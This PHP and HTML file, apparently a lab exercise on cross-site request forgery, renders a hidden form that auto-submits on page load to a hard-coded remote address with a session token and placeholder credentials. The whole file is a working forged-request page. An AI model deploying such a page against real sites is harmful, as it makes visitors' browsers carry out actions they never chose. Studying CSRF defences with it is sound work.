<?php
session_start();

$_SESSION["confirmation"] = bin2hex(random_bytes(16));
?>

<!DOCTYPE html>
<html>
<head>
    <title>csfr_form.php</title>
</head>
<body>

<form id="form" method="POST" action="http://68.183.204.71/csfr_action.php">
	<input type="hidden" name="confirmation" value="<?php echo $_SESSION["confirmation"]; ?>">
    <input type="hidden" name="username" value="host">
    <input type="hidden" name="password" value="pass">
</form>

<script>
    window.onload = function() {
        document.getElementById("form").submit();
    };
</script>

</body>
</html>